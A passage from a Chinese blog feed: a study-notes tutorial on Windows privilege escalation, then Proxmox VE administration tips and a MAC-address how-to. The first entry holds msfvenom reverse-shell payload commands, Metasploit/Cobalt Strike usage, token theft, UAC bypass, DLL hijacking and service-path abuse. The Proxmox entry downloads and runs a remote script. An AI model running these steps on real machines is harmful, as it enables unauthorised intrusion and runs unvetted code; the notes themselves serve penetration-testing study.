    <content type="html"><![CDATA[<h2 id="人工提权"><a href="#人工提权" class="headerlink" title="人工提权"></a><strong>人工提权</strong></h2><ol><li><p>在本地cmd执行systeminfo &gt; 1.txt</p></li><li><p>用脚本筛选可能漏洞</p></li></ol><p>python wes.py systeminfo.txt –color</p><p>python wes.py systeminfo.txt –color -i “Elevation of Privilege”</p><ol start="3"><li>针对提供漏洞找提权脚本</li></ol><p>KernelHub 针对常用溢出编号指定找EXP</p><p>Poc-in-Github 针对年份及编号指定找EXP</p><p>exploitdb 针对类型及关键说明指定找EXP</p><p>Exploit-DB 使用小结</p><p>searchsploit -u    更新数据库</p><p>searchsploit -h 查看帮助信息</p><ol><li>基本搜索：</li></ol><p>查找特定词的漏洞：</p><p>searchsploit afd windows local</p><ol start="2"><li>标题搜索 -t</li></ol><p>默认情况下，searchsploit将检查漏洞的标题以及路径。根据不同的搜索条件，这可能会弹出误报。可以使用 <code>-t</code> 选项将搜索限制为标题：</p><p>searchsploit -t oracle windows</p><p><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></p><p><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></p><p><a href="https://gitlab.com/exploit-database/exploitdb">https://gitlab.com/exploit-database/exploitdb</a></p><h2 id="msf使用"><a href="#msf使用" class="headerlink" title="msf使用"></a><strong>msf使用</strong></h2><ol><li>生成反弹后门</li></ol><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe</p><ol start="2"><li>配置监听会话</li></ol><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>exploit</p><ol start="2"><li>筛选EXP模块</li></ol><p>全自动：快速识别系统中可能被利用的漏洞</p><p>use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p><p>set showdescription true</p><ol start="3"><li>利用EXP溢出提权</li></ol><p>background</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</p><p>set session 1</p><p>exploit</p><h2 id="CS使用"><a href="#CS使用" class="headerlink" title="CS使用"></a><strong>CS使用</strong></h2><p>.&#x2F;teamserver IP password</p><ol><li><p>连接CS</p></li><li><p>创建监听器</p></li><li><p>加载脚本插件</p></li></ol><h2 id="土豆提权原理（MS16-075）"><a href="#土豆提权原理（MS16-075）" class="headerlink" title="土豆提权原理（MS16-075）"></a><strong>土豆提权原理（MS16-075）</strong></h2><p>土豆系列提权的核心是NTLM中继，通过欺骗运行在高权限（Administrator&#x2F;SYSTEM）的账户进行ntlm认证，同时作为中间人对认证过程进行劫持和重放，最后调用本地认证接口使用高权限账号的ntml认证获取一个高权限token，只要当前进程拥有SeImpersonatePrivilege权限即可进行令牌模仿，即可取得对应权限。</p><p>烂土豆(Rotten Potato) MS16-075 提权是一个本地提权，只针对本地用户，不支持域用户。</p><p>  欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端，对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的，模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</p><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a><strong>适用版本</strong></h4><p>  Windows 7&#x2F;8&#x2F;10，Windows server 2008&#x2F;2012</p><p><strong>Windows钓鱼提权</strong></p><p>应用场景：</p><ol><li><p>常规某个机器被钓鱼后门攻击后，我们需要做更高权限操作或权限维持等。</p></li><li><p>内网域中某个机器被钓鱼后门攻击后，我们需要对后续内网域做安全测试。</p></li></ol><h2 id="SC命令服务启动提权"><a href="#SC命令服务启动提权" class="headerlink" title="SC命令服务启动提权"></a><strong>SC命令服务启动提权</strong></h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>早期用at命令，但是现在不常用了，适用版本：<code>Win2000 &amp; Win2003 &amp; XP</code>中还是存在的，在<code>Win7</code>以后被剔除，所以本文不做研究</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>SC命令提权原理主要涉及Windows系统中的服务控制命令（Service Control Command）的利用。具体来说，SC命令是用于与服务控制管理器（Service Control Manager）和服务进行通信的命令行程序，它提供了类似于控制面板中管理工具项中的服务的功能。</p><p>在提权过程中，攻击者可能会使用SC命令以高权限运行的方式创建一个恶意的服务。这个服务可以在系统启动时以系统权限运行，从而实现权限提升。这是因为系统服务通常具有比普通用户更高的权限级别，可以执行一些需要高权限的操作。</p><h3 id="过程及命令"><a href="#过程及命令" class="headerlink" title="过程及命令"></a><strong>过程及命令</strong></h3><p>sc是用于与服务控制管理器和服务进行通信的命令行程序。</p><p>适用版本：windows 7&#x2F;10&#x2F;08&#x2F;12&#x2F;16&#x2F;19&#x2F;22，早期用at命令</p><ol><li>创建一个名叫syscmd的执行文件服务</li></ol><p>sc Create syscmd binPath&#x3D; “c:\msf.exe”</p><ol start="2"><li>运行服务</li></ol><p>sc start syscmd</p><h2 id="psexec-exe远程控制（提权）"><a href="#psexec-exe远程控制（提权）" class="headerlink" title="psexec.exe远程控制（提权）"></a><strong>psexec.exe远程控制（提权）</strong></h2><p>psexec.exe是Windows自带的程序不会被查杀</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h3><ol><li><p>服务控制管理器（SCM）：SCM是Windows系统中负责管理服务的组件，它允许用户启动、停止、暂停、恢复或查询服务的状态。服务是在Windows操作系统中以后台进程方式运行的应用程序，这些进程不需要用户交互，通常用于执行系统任务。</p></li><li><p>PsExec工具：PsExec是Sysinternals Suite中的一个工具，它允许用户在本地或远程计算机上执行命令。当PsExec在远程计算机上执行命令时，它首先会在远程计算机上安装一个名为PsExecSvc.exe的服务程序。这个服务程序允许PsExec在远程计算机上执行命令。</p></li><li><p>提权过程：</p></li></ol><ul><li><p>PsExec利用SCM启动一个新的服务，该服务的权限被设置为LocalSystem。LocalSystem是Windows系统中最高的权限级别之一，它拥有访问系统资源并执行各种操作的权限。</p></li><li><p>一旦服务被启动，PsExec就可以在该服务的上下文中启动进程。由于服务是以LocalSystem权限运行的，因此PsExec启动的进程也将拥有LocalSystem权限。这意味着PsExec可以执行需要更高权限才能完成的任务，例如访问受限制的文件或执行特权操作。</p></li></ul><h3 id="过程及命令-1"><a href="#过程及命令-1" class="headerlink" title="过程及命令"></a><strong>过程及命令</strong></h3><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>psexec.exe -accepteula -s -i -d cmd #调用运行cmd</p><h2 id="进程注入（降权-提权）"><a href="#进程注入（降权-提权）" class="headerlink" title="进程注入（降权&amp;提权）"></a><strong>进程注入（降权&amp;提权）</strong></h2><p>进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a><strong>场景</strong></h3><p>在域环境的时候可从其他用户降至需要的用户，查看相应客户使用的服务</p><p>administrator到system  可以</p><p>system到普通用户  可以</p><p>普通用户到以上用户 不行</p><p>实战中先确认当前用户权限</p><p>如果是administrator管理员用户组权限可以尝试进程注入和令牌窃取</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>查看相应权限进程可以提权和降权</p><h4 id="MSF："><a href="#MSF：" class="headerlink" title="MSF："></a><strong>MSF：</strong></h4><p>ps &#x2F;&#x2F;查看进程</p><p>migrate PID &#x2F;&#x2F;迁移对应PID</p><h4 id="CS"><a href="#CS" class="headerlink" title="CS:"></a><strong>CS:</strong></h4><p>ps &#x2F;&#x2F;查看进程</p><p>inject PID &#x2F;&#x2F;注入对应PID</p><p>建议直接用工具来进行进程注入，但是使用进程注入时MSF和CS会冲突，两个工具不能同时使用</p><h2 id="令牌窃取（降权-提权）"><a href="#令牌窃取（降权-提权）" class="headerlink" title="令牌窃取（降权&amp;提权）"></a><strong>令牌窃取（降权&amp;提权）</strong></h2><h3 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a><strong>场景</strong></h3><p>在域环境的时候可从其他用户降至需要的用户，查看相应客户使用的服务</p><p>administrator到system  可以</p><p>system到普通用户  可以</p><p>普通用户到以上用户 不行</p><p>实战中先确认当前用户权限</p><p>如果是administrator管理员用户组权限可以尝试进程注入和令牌窃取</p><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a><strong>过程</strong></h3><h4 id="MSF：-1"><a href="#MSF：-1" class="headerlink" title="MSF："></a><strong>MSF：</strong></h4><p>use incognito</p><p>list_tokens -u</p><p>impersonate_token “NT AUTHORITY\SYSTEM”</p><h4 id="CS-1"><a href="#CS-1" class="headerlink" title="CS:"></a><strong>CS:</strong></h4><p>ps &#x2F;&#x2F;查看进程</p><p>steal_token PID &#x2F;&#x2F;窃取进程令牌</p><p>spawnu PID &#x2F;&#x2F;窃取进程令牌上线</p><h2 id="UACbypass提权"><a href="#UACbypass提权" class="headerlink" title="UACbypass提权"></a><strong>UACbypass提权</strong></h2><p>UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，</p><h3 id="应用场景："><a href="#应用场景：" class="headerlink" title="应用场景："></a><strong>应用场景：</strong></h3><ol><li><p>常规某个机器被钓鱼后门攻击后，我们需要做更高权限操作或权限维持等。</p></li><li><p>内网域中某个机器被钓鱼后门攻击后，我们需要对后续内网域做安全测试。</p></li></ol><h3 id="UAC-实现方法（用户登陆过程）"><a href="#UAC-实现方法（用户登陆过程）" class="headerlink" title="UAC 实现方法（用户登陆过程）"></a><strong>UAC 实现方法（用户登陆过程）</strong></h3><p>ACL（Access Control List）：Windows 中所有资源都有 ACL ，这个列表决定了拥有何种权限的用户&#x2F;进程能够这个资源。在开启了 UAC 之后，如果用户是标准用户， Windows 会给用户分配一个标准 <code>Access Token</code>.如果用户以管理员权限登陆，会生成两份访问令牌，一份是完整的管理员访问令牌（Full Access Token），一份是标准用户令牌。一般情况下会以标准用户权限启动 Explorer.exe 进程。如果用户同意，则赋予完整管理员权限访问令牌进行操作。</p><h3 id="触发UAC"><a href="#触发UAC" class="headerlink" title="触发UAC"></a><strong>触发UAC</strong></h3><blockquote><p>UAC需要授权的动作包括：配置Windows Update增加或删除用户账户改变用户的账户类型改变UAC设置安装ActiveX安装或移除程序安装设备驱动程序设置家长控制将文件移动或复制到Program Files或Windows目录查看其他用户文件夹via Wiki</p></blockquote><h3 id="小迪笔记"><a href="#小迪笔记" class="headerlink" title="小迪笔记"></a><strong>小迪笔记</strong></h3><p>#Win10&amp;11-BypassUAC自动提权-MSF&amp;UACME</p><p>为了远程执行目标的exe或者bat可执行文件需要绕过此安全机制</p><p>在用户到系统权限自动提权中也学通过BypassUAC实现自动化提权</p><p>绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐)</p><p>开启UAC和未开启UAC时,CS&#x2F;MSF默认getsystem提权影响(进程注入等)</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx  lport&#x3D;xx -f exe -o msf.exe</p><p>推荐直接使用win10模块，更加符合真实场景</p><ol><li>MSF模块：</li></ol><p>钓鱼用的不推荐</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p><p>win7：</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassua</p><p>win10:</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup</p><ol start="2"><li>UACME项目：</li></ol><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>Akagi64.exe 编号 调用执行</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>UAC就是getsystem失败，然后你通过UACbypass就可以进行getsysteam</p><p>推荐使用UACME项目，很是不错，一个编号不行多换几个</p><p>编号范围1-78，没反应就是没成功</p><h2 id="Windows-DLL劫持提权"><a href="#Windows-DLL劫持提权" class="headerlink" title="Windows-DLL劫持提权"></a><strong>Windows-DLL劫持提权</strong></h2><p>简单说一下流程，就是有些进程权限很高，你就可以找到这些进程调用的dll来进行覆盖和劫持，msf可以生成dll马，要想实现dll劫持先找到进程调用的可劫持dll，不要找Windows文件下的，因为你没权限去修改dll文件，优先找exe文件下的dll，有火绒剑和一个项目ChkDllHijack可以检测都很好用</p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><p>Windows查找DLL目录及其顺序如下:</p><ol><li>应用程序加载的目录</li><li>C:\Windows\System32</li><li>C:\Windows\System</li><li>C:\Windows</li><li>当前工作目录Current Working Directory，CWD</li><li>在PATH环境变量的目录（先系统后用户）</li></ol><p>这样的加载顺序很容易导致一个系统dll被劫持，因为只要攻击者将目标文件和恶意dll放在一起即可,导致恶意dll先于系统dll加载，而系统dll是非常常见的，所以当时基于这样的加载顺序，出现了大量受影响软件。</p><h3 id="小迪笔记-1"><a href="#小迪笔记-1" class="headerlink" title="小迪笔记"></a><strong>小迪笔记</strong></h3><p>过程：信息收集-进程调试-制作dll并上传-替换dll-等待启动应用成功</p><p>检测：ChkDllHijack 火绒剑</p><p>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p><p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx  lport&#x3D;xx -f dll -o xiaodi.dll</p><p>提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</p><h2 id="Windows-不带引号服务路径配合MSF-MacroExpert"><a href="#Windows-不带引号服务路径配合MSF-MacroExpert" class="headerlink" title="Windows-不带引号服务路径配合MSF-MacroExpert"></a><strong>Windows-不带引号服务路径配合MSF-MacroExpert</strong></h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。</p><p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p><p>路径没有包含在引号中，服务会按照以下顺序依次执行</p><p>c:\program.exec:\program files.exec:\program files (x86)\grasssoft\macro.exec:\program files (x86)\grasssoft\macro expert\MacroService.exe</p><p>像这种exe路径没有空格也没有带引号的路径就没有安全问题</p><p>D:\网盘下载\百度网盘\BaiduNetdisk\YunUtilityService.exe</p><p>原理总结</p><p>服务路径配置由于目录空格问题，可上传文件配合解析恶意触发执行</p><h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>检测服务权限配置-制作文件并上传-服务路径指向解析-等待调用成功</p><p>检测命令：</p><p>wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\Windows\“ |findstr &#x2F;i &#x2F;v “””</p><p>上传反弹exe，设置好对应执行名后，执行sc start “Macro Expert”</p><h2 id="Win2012-不安全的服务权限配合MSF-NewServices"><a href="#Win2012-不安全的服务权限配合MSF-NewServices" class="headerlink" title="Win2012-不安全的服务权限配合MSF-NewServices"></a><strong>Win2012-不安全的服务权限配合MSF-NewServices</strong></h2><p>这个不好用就不过多阐述</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h3><p>Windows服务有时被配置为与服务本身或与服务运行的目录相关的弱权限。这可能允许攻击者操纵服务，以便在其启动时执行任意代码，并将权限提升到SYSTEM。</p><h3 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a><strong>利用方法：</strong></h3><p>将服务的 binpath 更改为我们上传的木马文件路径，以便在服务启动时执行恶意代码从而获得system权限。</p><p>accesschk.exe工具介绍：accesschk是一个windows系统配置检查工具，用于查看文件、注册表项、服务、进程、内核对象等的有效权限。该工具将有助于识别当前用户是否可以修改某个服务目录中的文件。</p><p>由于它是微软官方出品，我们将其上传至靶机，执行不会受到阻碍</p><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a><strong>过程：</strong></h3><p>检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p><p>检测脚本：</p><p>accesschk.exe -uwcqv “” *</p><p>sc config “test” binpath&#x3D; “C:\Program.exe”</p><p>sc start test</p><h2 id="小迪推荐项目"><a href="#小迪推荐项目" class="headerlink" title="小迪推荐项目"></a><strong>小迪推荐项目</strong></h2><p>综合类检测项目：</p><p><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p>PEAS-ng适用于Windows和Linux&#x2F;Unix*和MacOS的权限提升工具。</p><p>winPEAS.bat &gt; result.txt</p><p>winPEASany.exe log&#x3D;result.txt</p><p>原文转自：<a href="https://mp.weixin.qq.com/s/IvfcBpKWEvDA-j_TGa2oHQ">水刃安全</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>内网横向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Proxmox VE</title>
    <link href="/2024/05/30/%E7%B3%BB%E7%BB%9F/linux/ProxmoxVE/"/>
    <url>/2024/05/30/%E7%B3%BB%E7%BB%9F/linux/ProxmoxVE/</url>
    
    <content type="html"><![CDATA[<h3 id="存储策略和分区调整"><a href="#存储策略和分区调整" class="headerlink" title="存储策略和分区调整"></a>存储策略和分区调整</h3><blockquote><p>适合新部署pve的时候做的调整</p></blockquote><p>删除分区</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">lvremove</span> pve/<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>扩容到根分区</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lvextend</span> -l +<span class="hljs-number">100</span>%FREE -r pve/root<br></code></pre></td></tr></table></figure><h3 id="去除未订阅提示"><a href="#去除未订阅提示" class="headerlink" title="去除未订阅提示"></a>去除未订阅提示</h3><p>适用版本：v6-8</p><blockquote><p>ps:不要使用pvetools工具的去除订阅提示功能，会有系统级的bug，导致系统不稳定，频繁卡死</p></blockquote><p>逐行执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sed -i_orig <span class="hljs-string">&quot;s/data.status === &#x27;Active&#x27;/true/g&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/pve-manager/</span>js/pvemanagerlib.js<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sed -i_orig <span class="hljs-string">&quot;s/if (res === null || res === undefined || \!res || res/if(/g&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/javascript/</span>proxmox-widget-toolkit/proxmoxlib.js<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sed -i_orig <span class="hljs-string">&quot;s/.data.status.toLowerCase() !== &#x27;active&#x27;/false/g&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/javascript/</span>proxmox-widget-toolkit/proxmoxlib.js<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart pveproxy</span><br></code></pre></td></tr></table></figure><h3 id="显示硬件健康信息"><a href="#显示硬件健康信息" class="headerlink" title="显示硬件健康信息"></a>显示硬件健康信息</h3><p>实测在v8.4.1成功</p><p>直接执行以下命令，脚本来自GitHub项目：<a href="https://github.com/a904055262/PVE-manager-status">PVE-manager-status</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">(curl -Lf -o <span class="hljs-regexp">/tmp/</span>temp.sh https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/a904055262/</span>PVE-manager-status<span class="hljs-regexp">/main/</span>showtempcpufreq.sh || curl -Lf -o <span class="hljs-regexp">/tmp/</span>temp.sh https:<span class="hljs-regexp">//mi</span>rror.ghproxy.com<span class="hljs-regexp">/https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>a904055262<span class="hljs-regexp">/PVE-manager-status/m</span>ain<span class="hljs-regexp">/showtempcpufreq.sh) &amp;&amp; chmod +x /</span>tmp<span class="hljs-regexp">/temp.sh &amp;&amp; /</span>tmp/temp.sh remod<br></code></pre></td></tr></table></figure><p>效果图如下：</p><p><img src="/2024/05/30/%E7%B3%BB%E7%BB%9F/linux/ProxmoxVE/image.png" alt="alt text"></p><p>没有显示功耗的，请执行下面的命令安装依赖，请确保安装成功，就是最后的一行的输出，必须为 “成功!” 才表示安装成功了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt update ; apt install linux-cpupower &amp;&amp; modprobe msr &amp;&amp; <span class="hljs-built_in">echo</span> msr &gt; /etc/modules-load.d/turbostat-msr.conf &amp;&amp; <span class="hljs-built_in">chmod</span> +s /usr/sbin/turbostat &amp;&amp; <span class="hljs-built_in">echo</span> 成功！<br></code></pre></td></tr></table></figure><h3 id="pve修改id和名称"><a href="#pve修改id和名称" class="headerlink" title="pve修改id和名称"></a>pve修改id和名称</h3><h4 id="pve修改kvm虚拟机ID"><a href="#pve修改kvm虚拟机ID" class="headerlink" title="pve修改kvm虚拟机ID"></a>pve修改kvm虚拟机ID</h4><ol><li>关闭需要更改 ID 的虚拟机</li><li>重命名配置文件名，以及修改配置文件的硬盘位置（共2处）。<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/etc/</span>pve<span class="hljs-regexp">/nodes/</span>PVE<span class="hljs-regexp">/qemu-server/</span><br></code></pre></td></tr></table></figure></li><li>重命名硬盘文件名以及目录<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/vz/im</span>ages<br></code></pre></td></tr></table></figure></li><li>重命名备份文件<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cd <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/vz/</span><span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="pve修改lxc容器ID"><a href="#pve修改lxc容器ID" class="headerlink" title="pve修改lxc容器ID"></a>pve修改lxc容器ID</h4><ol><li>关闭需要更改 ID 的lxc容器</li><li>重命名配置文件名，以及修改配置文件​内容<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/etc/</span>pve<span class="hljs-regexp">/nodes/</span>PVE<span class="hljs-regexp">/lxc/</span><br></code></pre></td></tr></table></figure></li><li>修改存储卷路径<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/vz/im</span>ages/<br></code></pre></td></tr></table></figure></li><li>重命名备份文件<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cd <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/vz/</span><span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="pve修改lxc容器名称"><a href="#pve修改lxc容器名称" class="headerlink" title="pve修改lxc容器名称"></a>pve修改lxc容器名称</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>pve<span class="hljs-regexp">/lxc/</span>&lt;容器id&gt;.conf<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/lib/lxc/&lt;容器<span class="hljs-built_in">id</span>&gt;/config<br></code></pre></td></tr></table></figure><h3 id="pvetools问题"><a href="#pvetools问题" class="headerlink" title="pvetools问题"></a>pvetools问题</h3><h4 id="pvetools开启过CPU省电后-取消省电后不能睿频了"><a href="#pvetools开启过CPU省电后-取消省电后不能睿频了" class="headerlink" title="pvetools开启过CPU省电后 取消省电后不能睿频了"></a>pvetools开启过CPU省电后 取消省电后不能睿频了</h4><ol><li><p>编辑文件 <code>vi /etc/default/grub</code></p></li><li><p>删除这行 <code>GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet intel_pstate=disable&quot;intel_pstate=disable</code></p></li><li><p>然后再执行<code>update-grub</code>进行更新保存</p></li></ol><h3 id="解决60秒的硬超时"><a href="#解决60秒的硬超时" class="headerlink" title="解决60秒的硬超时"></a>解决60秒的硬超时</h3><p>主要解决在为虚拟机添加大容量磁盘的时候报错</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/perl5/</span>PVE/Cluster.pm<br></code></pre></td></tr></table></figure><p>定位到<code>alarm(60)</code> ，将60更改为您想要的任何超时，数字单位是秒。 然后重启pve系统</p><h3 id="pve存储库"><a href="#pve存储库" class="headerlink" title="pve存储库"></a>pve存储库</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">echo <span class="hljs-string">&quot;deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription&quot;</span> &gt; /etc/apt/sources<span class="hljs-meta">.list</span>.d/pve-no-subscription<span class="hljs-meta">.list</span><br></code></pre></td></tr></table></figure><p>可以在web管理界面选择禁用或者启用自动更新</p>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pev</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows改网卡mac地址</title>
    <link href="/2024/05/30/%E7%B3%BB%E7%BB%9F/windows/windows%E6%94%B9%E7%BD%91%E5%8D%A1mac%E5%9C%B0%E5%9D%80/"/>
    <url>/2024/05/30/%E7%B3%BB%E7%BB%9F/windows/windows%E6%94%B9%E7%BD%91%E5%8D%A1mac%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="改windows本机网卡的mac地址"><a href="#改windows本机网卡的mac地址" class="headerlink" title="改windows本机网卡的mac地址"></a>改windows本机网卡的mac地址</h1><p>控制面板打开需要改的网卡,进入属性</p><p><img src="/2024/05/30/%E7%B3%BB%E7%BB%9F/windows/windows%E6%94%B9%E7%BD%91%E5%8D%A1mac%E5%9C%B0%E5%9D%80/image.png" alt="alt text"></p><p>进入配置</p><p><img src="/2024/05/30/%E7%B3%BB%E7%BB%9F/windows/windows%E6%94%B9%E7%BD%91%E5%8D%A1mac%E5%9C%B0%E5%9D%80/image-1.png" alt="alt text"></p><p>高级 -&gt; 网络地址 ，改值即可<br>注意：这里的mac值要去掉特殊字符“-”，仅保留数字和字母就行了</p><p><img src="/2024/05/30/%E7%B3%BB%E7%BB%9F/windows/windows%E6%94%B9%E7%BD%91%E5%8D%A1mac%E5%9C%B0%E5%9D%80/image-2.png" alt="alt text"></p>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python脚本excel转Markdown(含合并单元格)</title>
    <link href="/2024/05/21/%E7%BC%96%E7%A8%8B/python%E8%84%9A%E6%9C%ACexcel%E8%BD%ACMarkdown-%E5%90%AB%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/"/>
    <url>/2024/05/21/%E7%BC%96%E7%A8%8B/python%E8%84%9A%E6%9C%ACexcel%E8%BD%ACMarkdown-%E5%90%AB%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/</url>
    
